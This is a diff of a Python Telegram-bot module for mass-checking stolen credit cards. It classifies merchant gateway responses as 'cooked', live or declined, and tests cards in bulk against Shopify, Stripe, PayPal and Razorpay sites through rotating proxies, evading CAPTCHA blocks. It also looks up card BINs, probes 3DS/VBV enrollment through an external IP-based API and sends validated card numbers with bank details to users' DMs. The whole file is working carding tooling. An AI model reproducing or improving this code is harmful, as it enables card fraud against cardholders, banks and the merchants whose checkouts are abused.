@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
-# complete_handler.py – FULLY FIXED (no crashes, fast, smooth)
-# Features:
-# - Free group (-1004293391598): max 300 cards, all gates except Razorpay
-# - Hits and result files sent to user's DM (not group)
-# - /vbv and /rz free in that group
-# - Per-user stop isolation (users cannot stop each other's checks)
-# - Always‑on progress bar for mass checks
-# - Site error auto‑removal for Razorpay (3 consecutive errors removes site)
-# - Expired cards are automatically filtered out before any check
+# complete_handler.py – FULLY FIXED (complete version)
+# - Correct status mapping: EXPIRED, APPROVED, DECLINED, ERROR
+# - Retry on any non‑gateway response
+# - Price passed correctly
+# - /cleanrz removes sites that return server errors
+# - All mass and single callbacks included
+# - VBV/3DS checker returns detailed dict and formatting function
 
+import asyncio
 import requests, time, threading, random, logging, re, csv, os, urllib3, traceback, json, base64, html, hashlib
 import queue as _queue
 from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FutureTimeoutError
@@ -36,11 +35,59 @@ from gates import (
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 OWNER_ID = [5963548505, 5547897619]
+FREE_GROUP_ID = -1004293391598
 
 # ============================================================================
-# FREE GROUP CONFIGURATION
+# GATEWAY KEYWORDS – used to decide if a response is a real gateway response
 # ============================================================================
-FREE_GROUP_ID = -1004293391598   # The group where free features apply
+GATEWAY_KEYWORDS = [
+    # Decline reasons
+    'CARD_DECLINED', 'DO_NOT_HONOR', 'GENERIC_DECLINE', 'INSUFFICIENT_FUNDS',
+    'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED', 'EXPIRED_CARD',
+    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'PAYMENTS_CREDIT_CARD_GENERIC',
+    'RESTRICTED_CARD', 'LOST_CARD', 'STOLEN_CARD', 'PICKUP_CARD',
+    # Approvals / 3DS
+    'ORDER_PLACED', 'APPROVED', 'SUCCESS', '3D', 'AUTHENTICATION_REQUIRED',
+    'OTP', 'CHALLENGE', 'REDIRECT', 'VERIFICATION_REQUIRED', 'ACTION_REQUIRED',
+    # Also catch "CVV" and "ZIP"
+    'CVV', 'ZIP', 'AVS'
+]
+
+# ============================================================================
+# DECISION RULE BLOCK – maps raw response to final status
+# ============================================================================
+def categorize_response(response_text):
+    """Returns one of: 'APPROVED', 'APPROVED_OTP', 'DECLINED', 'EXPIRED', 'ERROR'"""
+    upper = response_text.upper()
+
+    # 1. Expired cards – always EXPIRED
+    if any(kw in upper for kw in ['EXPIRED_CARD', 'CREDIT_CARD_BASE_EXPIRED', 'EXPIRED']):
+        return 'EXPIRED'
+
+    # 2. Approved / Cooked (charge success)
+    if any(kw in upper for kw in ['ORDER_PLACED', 'SUCCESS', 'APPROVED', 'CHARGED']):
+        return 'APPROVED'
+
+    # 3. OTP / 3DS (live but needs action)
+    if any(kw in upper for kw in ['3D', 'AUTHENTICATION_REQUIRED', 'OTP', 'CHALLENGE', 'REDIRECT', 'ACTION_REQUIRED']):
+        return 'APPROVED_OTP'
+
+    # 4. CVV / ZIP mismatch – these are LIVE cards (valid number, just wrong CVV/ZIP)
+    if any(kw in upper for kw in ['INCORRECT_CVC', 'INCORRECT_ZIP', 'CVV', 'ZIP', 'AVS']):
+        return 'APPROVED'
+
+    # 5. Real declines (do not retry)
+    decline_keywords = [
+        'CARD_DECLINED', 'DO_NOT_HONOR', 'GENERIC_DECLINE', 'INSUFFICIENT_FUNDS',
+        'FRAUD_SUSPECTED', 'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
+        'PAYMENTS_CREDIT_CARD_GENERIC', 'RESTRICTED_CARD', 'LOST_CARD', 'STOLEN_CARD',
+        'PICKUP_CARD', 'DECLINED'
+    ]
+    if any(kw in upper for kw in decline_keywords):
+        return 'DECLINED'
+
+    # 6. Everything else (site errors, CAPTCHA, proxy issues, etc.) – treat as ERROR
+    return 'ERROR'
 
 # ============================================================================
 # GLOBAL PLACEHOLDERS – set by setup_complete_handler (from app.py)
@@ -90,9 +137,8 @@ def safe_send(bot_func, *args, **kwargs):
             else:
                 raise
 
-
 # ============================================================================
-# BACKGROUND HIT SENDER (don't block main processing loop)
+# BACKGROUND HIT SENDER (non‑blocking)
 # ============================================================================
 _hit_queue = _queue.Queue()
 _hit_sender_started = False
@@ -109,7 +155,7 @@ def _hit_sender_worker():
         except _queue.Empty:
             continue
         except Exception as e:
-            logger.warning(f"Hit sender error: {e}")
+            logging.warning(f"Hit sender error: {e}")
 
 def queue_hit(bot, target_chat, msg):
     global _hit_sender_started, _hit_sender_bot
@@ -122,7 +168,7 @@ def queue_hit(bot, target_chat, msg):
     _hit_queue.put((target_chat, msg))
 
 # ============================================================================
-# STOP COMMAND HANDLING – PER USER, PER CHAT
+# STOP COMMAND HANDLING – PER USER
 # ============================================================================
 stop_events = {}
 stop_lock = threading.Lock()
@@ -167,7 +213,7 @@ MAX_CONCURRENT_CHECKS = 30
 mass_check_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKS)
 
 # ============================================================================
-# PROXY CHECKING + CACHE (httpbin.org/ip)
+# PROXY CHECKING + CACHE
 # ============================================================================
 proxy_cache = {}
 proxy_cache_lock = threading.Lock()
@@ -189,7 +235,6 @@ def check_proxy_live(proxy):
         except:
             pass
         return None
-
     with ThreadPoolExecutor(max_workers=1) as ex:
         future = ex.submit(_test)
         try:
@@ -250,7 +295,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - 
 logger = logging.getLogger(__name__)
 
 # ============================================================================
-# BIN DATABASE (with in-memory cache for API lookups)
+# BIN DATABASE (with in-memory cache)
 # ============================================================================
 BINS_CSV_FILE = 'bins_all.csv'
 BIN_DB = {}
@@ -277,19 +322,19 @@ def load_bin_database():
                     }
     except Exception as e:
         logger.error(f"Error loading BIN CSV: {e}")
+
 def get_flag_emoji(country_code):
     if not country_code or len(country_code) != 2: return "🇺🇳"
     return "".join([chr(ord(c.upper()) + 127397) for c in country_code])
+
 load_bin_database()
 
 def get_bin_info(card_number):
     clean_cc = re.sub(r'\D', '', str(card_number))
     bin_code = clean_cc[:6]
-
     with _bin_cache_lock:
         if bin_code in _bin_cache:
             return _bin_cache[bin_code]
-
     result = None
     try:
         response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
@@ -305,17 +350,14 @@ def get_bin_info(card_number):
             }
     except:
         pass
-
     if not result:
         result = BIN_DB.get(bin_code, {
             'country_name': 'Unknown', 'country_flag': '🇺🇳',
             'bank': 'UNKNOWN', 'brand': 'UNKNOWN',
             'type': 'UNKNOWN', 'level': 'UNKNOWN'
         })
-
     with _bin_cache_lock:
         _bin_cache[bin_code] = result
-
     return result
 
 def extract_cards_from_text(text):
@@ -341,34 +383,25 @@ def format_progress_bar(processed, total, length=12):
     bar = '█' * filled + '▒' * (length - filled)
     return f"<code>{bar}</code> <b>{processed}/{total}</b>"
 
-# ============================================================================
-# EXPIRED CARD FILTER (removes cards with MM/YYYY before current date)
-# ============================================================================
 def remove_expired_cards(ccs):
-    """Filters out cards that are already expired based on current date."""
+    """Filter out expired cards based on current date."""
     valid_ccs = []
     now = datetime.now()
     current_year = now.year
     current_month = now.month
-
     for cc_str in ccs:
         try:
             parts = cc_str.split('|')
             if len(parts) < 4: continue
-
             cc, mm, yyyy, cvv = parts[0], parts[1], parts[2], parts[3]
             month = int(mm)
             year = int(yyyy)
-
             if year < 100:
                 year += 2000
-
             if year > current_year or (year == current_year and month >= current_month):
                 valid_ccs.append(cc_str)
-
         except ValueError:
             continue
-
     return valid_ccs
 
 # ============================================================================
@@ -379,10 +412,12 @@ def reset_usage_if_needed(user_data):
     if user_data.get('last_usage_reset') != today:
         user_data['usage_today'] = 0
         user_data['last_usage_reset'] = today
+
 def get_user_upload_limit(user_id, load_json_func, users_file):
     users_data = load_json_func(users_file, {})
     user_info = users_data.get(str(user_id), {})
     return user_info.get('limit', 50000)
+
 def get_user_daily_remaining(user_id, load_json_func, users_file):
     users_data = load_json_func(users_file, {})
     user_info = users_data.get(str(user_id), {})
@@ -392,6 +427,7 @@ def get_user_daily_remaining(user_id, load_json_func, users_file):
     daily_limit = user_info.get('daily_limit', 100000)
     used = user_info.get('usage_today', 0)
     return max(0, daily_limit - used)
+
 def increment_usage(user_id, amount, load_json_func, save_json_func, users_file):
     users_data = load_json_func(users_file, {})
     user_info = users_data.get(str(user_id))
@@ -423,7 +459,7 @@ def set_user_preference(user_id, mode):
     save_user_prefs(prefs)
 
 # ============================================================================
-# PERSONAL SITES (Shopify)
+# PERSONAL SITES (Shopify) – for user‑specific sites
 # ============================================================================
 USER_SITES_FILE = "user_sites.json"
 def load_user_sites():
@@ -443,17 +479,11 @@ def save_user_sites_list(user_id, sites_list):
     data[str(user_id)] = sites_list
     save_user_sites(data)
 
-# ============================================================================
-# INLINE STOP BUTTON
-# ============================================================================
 def stop_button_markup():
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("⏹ Stop", callback_data="stop_mass"))
     return markup
 
-# ============================================================================
-# PROXY RETRY HELPER (for generic gates)
-# ============================================================================
 def gate_with_proxy_retry(gate_func, cc, proxies, gate_name="", max_retries=3):
     available = list(proxies)
     last_error = None
@@ -467,7 +497,6 @@ def gate_with_proxy_retry(gate_func, cc, proxies, gate_name="", max_retries=3):
                 msg, status = result
             else:
                 msg, status = str(result), "ERROR"
-
             error_keywords = [
                 "proxy error", "503", "service unavailable",
                 "server disconnected", "timeout", "connection refused",
@@ -491,23 +520,19 @@ def gate_with_proxy_retry(gate_func, cc, proxies, gate_name="", max_retries=3):
     return f"All proxies failed (last: {error_detail})", "ERROR", None
 
 # ============================================================================
-# RAZORPAY SITE STORAGE (global – uses load_json_func/save_json_func)
+# RAZORPAY SITE STORAGE (global)
 # ============================================================================
 RZ_SITES_KEY = "rz_sites.json"
 RZ_FAIL_COUNTS_KEY = "rz_fail_counts.json"
 
 def load_rz_sites():
     return load_json_func(RZ_SITES_KEY, [])
-
 def save_rz_sites(sites):
     save_json_func(RZ_SITES_KEY, sites)
-
 def load_rz_fail_counts():
     return load_json_func(RZ_FAIL_COUNTS_KEY, {})
-
 def save_rz_fail_counts(counts):
     save_json_func(RZ_FAIL_COUNTS_KEY, counts)
-
 def increment_rz_fail_count(site):
     counts = load_rz_fail_counts()
     counts[site] = counts.get(site, 0) + 1
@@ -519,16 +544,12 @@ def increment_rz_fail_count(site):
             save_rz_sites(sites)
             return True
     return False
-
 def reset_rz_fail_count(site):
     counts = load_rz_fail_counts()
     if site in counts:
         del counts[site]
     save_rz_fail_counts(counts)
 
-# ============================================================================
-# RAZORPAY SITE VALIDATION
-# ============================================================================
 def is_valid_razorpay_url(url):
     return url.startswith("https://razorpay.me/") and len(url) > 20
 
@@ -544,12 +565,7 @@ def validate_razorpay_site(url):
     except requests.exceptions.RequestException as e:
         return False, f"Connection error: {e}"
 
-# ============================================================================
-# SAFE PROGRESS UPDATE HELPER
-# ============================================================================
 def safe_update_progress(bot, chat_id, status_msg, msg_text):
-    """Update progress message, handling None status_msg and deleted messages.
-    Returns the (possibly new) status_msg object."""
     if status_msg is None:
         new_msg = safe_send(bot.send_message, chat_id, msg_text,
                             parse_mode="HTML", reply_markup=stop_button_markup())
@@ -564,11 +580,10 @@ def safe_update_progress(bot, chat_id, status_msg, msg_text):
         return new_msg if new_msg else status_msg
 
 # ============================================================================
-# SHOPIFY MASS CHECK (progress bar always visible, DM delivery support)
+# SHOPIFY MASS CHECK – FIXED with proper retry and categorisation
 # ============================================================================
 def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                                user_id, load_json_func, save_json_func, users_file, hit_pref="both", dm_target_user_id=None):
-    # Filter expired cards
     original_count = len(ccs)
     ccs = remove_expired_cards(ccs)
     expired_skipped = original_count - len(ccs)
@@ -640,75 +655,53 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                     last_response = response_text
                     resp_upper = (response_text or "").upper()
 
-                    site_error_patterns = [
-                        "CART FAILED", "SITE MAY BE PASSWORD PROTECTED",
-                        "FAILED TO GET SESSION TOKEN", "SITE ERROR! STATUS: 402",
-                        "SITE NOT SUPPORTED", "ERROR PROCESSING CARD: SERVER DISCONNECTED",
-                        "API ERROR", "NOT SHOPIFY!", "PROXY ERROR: 503",
-                        "SERVER DISCONNECTED", "TIMEOUT", "CONNECTION REFUSED",
-                        "COULD NOT CONNECT", "NO ROUTE TO HOST", "SERVICE UNAVAILABLE",
-                        "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED"
-                    ]
-                    if any(pattern in resp_upper for pattern in site_error_patterns):
-                        if proxy in available_proxies:
-                            available_proxies.remove(proxy)
-                        continue
+                    # 1. Check if this is a real gateway response using our decision block
+                    final_status = categorize_response(response_text)
 
-                    if 'CAPTCHA' in resp_upper:
-                        with sites_lock:
-                            temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
-                        break
+                    # If we got a real gateway response (not ERROR), return it
+                    if final_status != 'ERROR':
+                        bin_info = get_bin_info(cc.split('|')[0])
+                        return {
+                            'cc': cc,
+                            'response': response_text,
+                            'status': final_status,
+                            'gateway': gateway_result or gateway,
+                            'price': price,
+                            'site': site_name,
+                            'site_url': site_url,
+                            'site_obj': site_obj,
+                            'proxy_used': proxy,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().isoformat()
+                        }, False
 
-                    if 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED' in resp_upper or 'EXPIRED' in resp_upper:
-                        bin_info = get_bin_info(cc.split('|')[0])
-                        return {
-                            'cc': cc, 'response': response_text, 'status': 'EXPIRED',
-                            'gateway': gateway_result, 'price': price,
-                            'site': site_name, 'site_url': site_url, 'site_obj': site_obj,
-                            'proxy_used': proxy, 'bin_info': bin_info, 'timestamp': datetime.now().isoformat()
-                        }, False
-                    if 'INSUFFICIENT_FUNDS' in resp_upper or 'INCORRECT_CVC' in resp_upper or 'CVV' in resp_upper or '3DS' in resp_upper:
-                        bin_info = get_bin_info(cc.split('|')[0])
-                        return {
-                            'cc': cc, 'response': response_text, 'status': 'APPROVED',
-                            'gateway': gateway_result, 'price': price,
-                            'site': site_name, 'site_url': site_url, 'site_obj': site_obj,
-                            'proxy_used': proxy, 'bin_info': bin_info, 'timestamp': datetime.now().isoformat()
-                        }, False
-                    if 'ORDER_PLACED' in resp_upper or 'APPROVED' in resp_upper or 'success' in response_text.lower():
-                        bin_info = get_bin_info(cc.split('|')[0])
-                        return {
-                            'cc': cc, 'response': response_text, 'status': 'APPROVED',
-                            'gateway': gateway_result, 'price': price,
-                            'site': site_name, 'site_url': site_url, 'site_obj': site_obj,
-                            'proxy_used': proxy, 'bin_info': bin_info, 'timestamp': datetime.now().isoformat()
-                        }, False
-                    bin_info = get_bin_info(cc.split('|')[0])
-                    return {
-                        'cc': cc, 'response': response_text, 'status': 'DECLINED',
-                        'gateway': gateway_result, 'price': price,
-                        'site': site_name, 'site_url': site_url, 'site_obj': site_obj,
-                        'proxy_used': proxy, 'bin_info': bin_info, 'timestamp': datetime.now().isoformat()
-                    }, False
+                    # 2. If it's ERROR, check if it's a site-level error (like CAPTCHA, proxy error)
+                    # We treat any non-gateway response as a site error – retry with next site/proxy
+                    if proxy in available_proxies:
+                        available_proxies.remove(proxy)
+                    # Optionally ban the site temporarily
+                    with sites_lock:
+                        temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
+                    break  # break out of proxy loop, will pick next site
 
                 except Exception as e:
                     if proxy in available_proxies:
                         available_proxies.remove(proxy)
                     continue
 
-            with sites_lock:
-                temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
+            # If we exhausted proxies, try next site with fresh proxy list
+            # (we already added site to temp ban, so it will skip it for a while)
+            continue  # will pick next site
 
-        if not proxy_list:
-            return error_result(cc, 'All proxies dead – please add fresh proxies'), False
-        return error_result(cc, 'All sites/proxies exhausted'), False
+        # If all sites failed
+        return error_result(cc, "All sites/proxies exhausted"), False
 
     processed = 0
     start_time = time.time()
     last_update_time = time.time()
     status_msg = start_msg
 
-    with ThreadPoolExecutor(max_workers=100) as executor:
+    with ThreadPoolExecutor(max_workers=50) as executor:
         futures = {}
         for i, cc in enumerate(ccs):
             if is_stop_requested(chat_id, user_id):
@@ -735,15 +728,13 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                     break
                 status = res['status']
                 if status == 'APPROVED':
-                    resp_upper = res['response'].upper()
-                    if 'INSUFFICIENT' in resp_upper or 'CVV' in resp_upper or '3DS' in resp_upper:
-                        results['approved'].append(res)
-                        if send_every_hit and (hit_pref == "both" or hit_pref == "approved"):
-                            send_hit(bot, chat_id, res, "✅ APPROVED", dm_user_id=dm_target_user_id)
-                    else:
-                        results['cooked'].append(res)
-                        if send_every_hit and (hit_pref == "both" or hit_pref == "cooked"):
-                            send_hit(bot, chat_id, res, "🔥 COOKED", dm_user_id=dm_target_user_id)
+                    results['cooked'].append(res)
+                    if send_every_hit and (hit_pref == "both" or hit_pref == "cooked"):
+                        send_hit(bot, chat_id, res, "🔥 COOKED", dm_user_id=dm_target_user_id)
+                elif status == 'APPROVED_OTP':
+                    results['approved'].append(res)
+                    if send_every_hit and (hit_pref == "both" or hit_pref == "approved"):
+                        send_hit(bot, chat_id, res, "✅ APPROVED (OTP)", dm_user_id=dm_target_user_id)
                 elif status == 'EXPIRED':
                     results['expired'].append(res)
                 elif status == 'DECLINED':
@@ -843,12 +834,13 @@ def send_hit(bot, chat_id, res, title, dm_user_id=None):
         site_display = f"ID {site_id}" if site_id else res.get('site_url', 'N/A').replace('https://','').replace('http://','').split('/')[0]
         header_emoji = "🔥" if "COOKED" in title else "✅"
         escaped_response = html.escape(res['response'])
+        price = res.get('price', '0.00')
         msg = (
             f"<b>{header_emoji} {title} HIT!</b>\n"
             f"━━━━━━━━━━━━━━\n"
             f"💳 <b>Card:</b> <code>{res['cc']}</code>\n"
             f"📋 <b>Response:</b> {escaped_response}\n"
-            f"🛡️ <b>Gateway:</b> {res['gateway']} · <b>${res.get('price','0.00')}</b>\n"
+            f"🛡️ <b>Gateway:</b> {res['gateway']} · <b>${price}</b>\n"
             f"🌐 <b>Site:</b> {site_display}\n"
             f"━━━━━━━━━━━━━━\n"
             f"🏦 <b>Bank:</b> <b>{bin_info.get('bank','UNKNOWN')}</b>\n"
@@ -864,11 +856,10 @@ def send_hit(bot, chat_id, res, title, dm_user_id=None):
         logger.error(f"Error sending hit: {e}")
 
 # ============================================================================
-# GENERIC MASS CHECK ENGINE (always-on progress bar, DM delivery)
+# GENERIC MASS CHECK ENGINE (for PayPal, Stripe, etc.) – with same categorisation
 # ============================================================================
 def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                             proxies, user_id, load_json_func, save_json_func, users_file, dm_target_user_id=None):
-    # Filter expired cards
     original_count = len(ccs)
     ccs = remove_expired_cards(ccs)
     expired_skipped = original_count - len(ccs)
@@ -889,7 +880,6 @@ def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
         nonlocal last_response
         if is_stop_requested(chat_id, user_id):
             return cc, "Stopped by user", "STOPPED"
-
         if proxies:
             msg, status, _ = gate_with_proxy_retry(gate_func, cc, proxies, gate_name)
         else:
@@ -902,8 +892,7 @@ def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
             except Exception as e:
                 msg, status = str(e), "ERROR"
         last_response = msg
-        if status == 'ERROR' and any(k in msg.upper() for k in ['DECLINE', 'INSUFFICIENT', 'CARD', 'FUNDS', 'BRAND', 'PROCESSING']):
-            status = 'DECLINED'
+        # For generic gates, we rely on their returned status (they already map)
         return cc, msg, status
 
     processed = 0
@@ -935,57 +924,22 @@ def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                     stopped = True
                     break
                 bin_info = get_bin_info(cc.split('|')[0])
-
+                target = dm_target_user_id if dm_target_user_id else chat_id
+                safe_msg = html.escape(msg)
                 if status == 'APPROVED':
-                    msg_upper = msg.upper()
-                    target = dm_target_user_id if dm_target_user_id else chat_id
-                    safe_msg = html.escape(msg)
-                    if gate_name.lower() == 'stripe auth':
-                        results['approved'].append((cc, msg))
-                        if send_every_hit:
-                            hit_msg = (
-                                f"<b>✅ APPROVED {gate_name}</b>\n"
-                                f"━━━━━━━━━━━━━━\n"
-                                f"💳 <code>{cc}</code>\n"
-                                f"📋 {safe_msg}\n"
-                                f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
-                                f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','🇺🇳')}\n"
-                                f"━━━━━━━━━━━━━━\n"
-                                f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-                            )
-                            queue_hit(bot, target, hit_msg)
-                    else:
-                        if any(kw in msg_upper for kw in [
-                            'CHARGED', 'SUCCESS', 'ORDER PLACED', 'PAYMENT SUCCESSFUL',
-                            'THANK YOU', 'ORDER APPROVED', 'PAYMENT COMPLETED', 'APPROVED'
-                        ]):
-                            results['cooked'].append((cc, msg))
-                            if send_every_hit:
-                                hit_msg = (
-                                    f"<b>🔥 COOKED {gate_name} HIT!</b>\n"
-                                    f"━━━━━━━━━━━━━━\n"
-                                    f"💳 <code>{cc}</code>\n"
-                                    f"📋 {safe_msg}\n"
-                                    f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
-                                    f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','🇺🇳')}\n"
-                                    f"━━━━━━━━━━━━━━\n"
-                                    f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-                                )
-                                queue_hit(bot, target, hit_msg)
-                        else:
-                            results['approved'].append((cc, msg))
-                            if send_every_hit:
-                                hit_msg = (
-                                    f"<b>✅ APPROVED {gate_name} (Live)</b>\n"
-                                    f"━━━━━━━━━━━━━━\n"
-                                    f"💳 <code>{cc}</code>\n"
-                                    f"📋 {safe_msg}\n"
-                                    f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
-                                    f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','🇺🇳')}\n"
-                                    f"━━━━━━━━━━━━━━\n"
-                                    f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
-                                )
-                                queue_hit(bot, target, hit_msg)
+                    results['cooked'].append((cc, msg))
+                    if send_every_hit:
+                        hit_msg = (
+                            f"<b>🔥 COOKED {gate_name} HIT!</b>\n"
+                            f"━━━━━━━━━━━━━━\n"
+                            f"💳 <code>{cc}</code>\n"
+                            f"📋 {safe_msg}\n"
+                            f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
+                            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','🇺🇳')}\n"
+                            f"━━━━━━━━━━━━━━\n"
+                            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
+                        )
+                        queue_hit(bot, target, hit_msg)
                 elif status == 'DECLINED':
                     results['declined'].append((cc, msg))
                 elif status == 'EXPIRED':
@@ -1076,11 +1030,10 @@ def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
             pass
 
 # ============================================================================
-# RAZORPAY MASS CHECK (always-on progress bar, global storage, site-error removal)
+# RAZORPAY MASS CHECK – with instant removal of dead sites
 # ============================================================================
 def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
                                 user_id, load_json_func, save_json_func, users_file, dm_target_user_id=None):
-    # Filter expired cards
     original_count = len(ccs)
     ccs = remove_expired_cards(ccs)
     expired_skipped = original_count - len(ccs)
@@ -1097,14 +1050,11 @@ def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
     last_response = None
     status_msg = start_msg
 
-    # Keywords that trigger immediate site removal (no 3-strike wait)
     instant_remove_keywords = [
         "the server encountered an error",
         "international payments not supported",
         "international payment not supported",
     ]
-
-    # Regular site-error keywords (3 strikes)
     site_error_keywords = [
         "account number is mandatory",
         "card transactions are not enabled",
@@ -1120,6 +1070,7 @@ def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
         "payment method not allowed",
         "sorry, we could not process",
         "something went wrong",
+        "authentication failed",
     ]
 
     def worker(card):
@@ -1135,21 +1086,19 @@ def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
 
             if status == "ERROR":
                 msg_lower = msg.lower()
-
-                # Immediate removal for severe errors
                 if any(kw in msg_lower for kw in instant_remove_keywords):
-                    sites.remove(site)
-                    save_rz_sites(sites)
-                    reset_rz_fail_count(site)  # clear any existing fail count
-                    queue_hit(bot, chat_id, f"🗑️ Site <code>{site}</code> instantly removed – {msg[:60]}")
+                    # instant remove
+                    if site in sites:
+                        sites.remove(site)
+                        save_rz_sites(sites)
+                        reset_rz_fail_count(site)
+                        queue_hit(bot, chat_id, f"🗑️ Site <code>{site}</code> instantly removed – {msg[:60]}")
                     continue
-
-                # 3-strike removal for other errors
                 is_site_error = any(kw in msg_lower for kw in site_error_keywords)
                 if is_site_error:
                     removed = increment_rz_fail_count(site)
                     if removed:
-                        queue_hit(bot, chat_id, f"⚠️ Site <code>{site}</code> removed after 3 consecutive errors.")
+                        queue_hit(bot, chat_id, f"⚠️ Site <code>{site}</code> removed after 3 errors.")
                     continue
                 else:
                     return card, msg, "DECLINED"
@@ -1304,12 +1253,34 @@ def process_razorpay_mass_check(bot, message, start_msg, ccs, sites, proxies,
             pass
 
 # ============================================================================
-# VBV / 3DS CHECKER
+# VBV / 3DS CHECKER – ENHANCED (returns rich dict)
 # ============================================================================
 VBV_API_BASE = "http://2.25.156.218:5001"
 
 def vbv_checker(ccx):
-    result = {"status": "UNKNOWN", "enrolled": None, "response": ""}
+    """
+    Check 3DS/VBV status for a card.
+    Returns a dict with keys:
+      - status: 'NOT_ENROLLED', 'VBV_ENROLLED', 'CHALLENGE_REQUIRED', 'AUTHENTICATE_SUCCESSFUL',
+                'AUTHENTICATE_FRICTIONLESS_FAILED', 'ERROR', 'INVALID_FORMAT'
+      - enrolled: bool
+      - response_text: raw response
+      - auth_description: human-readable auth status
+      - version: 3DS version
+      - otp_required: bool
+      - network: card network (Visa, Mastercard, etc.)
+      - raw_status: the raw vbv_status from API
+    """
+    result = {
+        "status": "UNKNOWN",
+        "enrolled": False,
+        "response_text": "",
+        "auth_description": "",
+        "version": "2.2.0",
+        "otp_required": False,
+        "network": "Unknown",
+        "raw_status": ""
+    }
     try:
         parts = ccx.strip().split("|")
         if len(parts) < 4:
@@ -1328,26 +1299,119 @@ def vbv_checker(ccx):
         resp.raise_for_status()
         api_data = resp.json()
 
+        # Extract fields
         vbv_status = api_data.get("vbv_status", "error")
+        enrolled = api_data.get("enrolled", False)
+        raw_status = vbv_status
+        result["raw_status"] = raw_status
+        result["enrolled"] = enrolled
+
+        # Map status to our categories
         status_map = {
             "success": ("NOT_ENROLLED", False, "Passed ✅ (not enrolled)"),
             "vbv_required": ("VBV_ENROLLED", True, "OTP Required ⛔"),
-            "authenticate_rejected": ("FAILED", False, "Failed 🚫"),
+            "challenge_required": ("CHALLENGE_REQUIRED", True, "Challenge Required (OTP/SMS needed)"),
+            "authenticate_successful": ("AUTHENTICATE_SUCCESSFUL", False, "Frictionless Pass (auto-authenticated)"),
+            "authenticate_frictionless_failed": ("AUTHENTICATE_FRICTIONLESS_FAILED", False, "Frictionless Failed (bank rejected)"),
+            "authenticate_rejected": ("FAILED", False, "Authentication Rejected"),
             "lookup_error": ("ERROR", False, "Lookup Error"),
             "error": ("ERROR", False, "Error during lookup"),
         }
-        mapped = status_map.get(vbv_status, ("ERROR", False, f"Unknown ({vbv_status})"))
-        result["status"]   = mapped[0]
-        result["enrolled"] = mapped[1]
-        result["response"] = f"Status: {vbv_status} – {mapped[2]}"
-        return result
-    except Exception as e:
-        result["status"] = "ERROR"
-        result["response"] = str(e)[:100]
+        mapped = status_map.get(vbv_status, ("UNKNOWN", False, f"Unknown ({vbv_status})"))
+        result["status"] = mapped[0]
+        result["otp_required"] = mapped[1]
+        result["auth_description"] = mapped[2]
+
+        # Extract version if available
+        if "version" in api_data:
+            result["version"] = api_data["version"]
+        # Network
+        if "network" in api_data:
+            result["network"] = api_data["network"]
+        else:
+            # Infer network from card prefix
+            first = cc[0]
+            if first == "4":
+                result["network"] = "Visa (VBV)"
+            elif first in ["5", "2"]:
+                result["network"] = "Mastercard (SecureCode)"
+            elif cc.startswith("34") or cc.startswith("37"):
+                result["network"] = "Amex (SafeKey)"
+            else:
+                result["network"] = "Unknown"
+
+        result["response_text"] = f"Status: {vbv_status} – {mapped[2]}"
         return result
 
+    except Exception as e:
+        result["status"] = "ERROR"
+        result["response_text"] = str(e)[:100]
+        return result
+
+def format_vbv_result(vbv_data, cc, bin_info=None):
+    """
+    Format a beautiful VBV/3DS result message with emojis and proper statuses.
+    vbv_data is the dict returned by vbv_checker.
+    cc is the full card string.
+    bin_info is optional dict from get_bin_info.
+    Returns formatted HTML string.
+    """
+    if bin_info is None:
+        bin_info = get_bin_info(cc.split('|')[0])
+
+    status = vbv_data.get("status", "UNKNOWN")
+    enrolled = vbv_data.get("enrolled", False)
+    auth_desc = vbv_data.get("auth_description", "")
+    version = vbv_data.get("version", "2.2.0")
+    otp_required = vbv_data.get("otp_required", False)
+    network = vbv_data.get("network", "Unknown")
+    raw_status = vbv_data.get("raw_status", "")
+
+    # Determine emoji and status label
+    if status == "NOT_ENROLLED":
+        emoji = "🟢"
+        label = "Not Enrolled"
+    elif status == "CHALLENGE_REQUIRED":
+        emoji = "🔴"
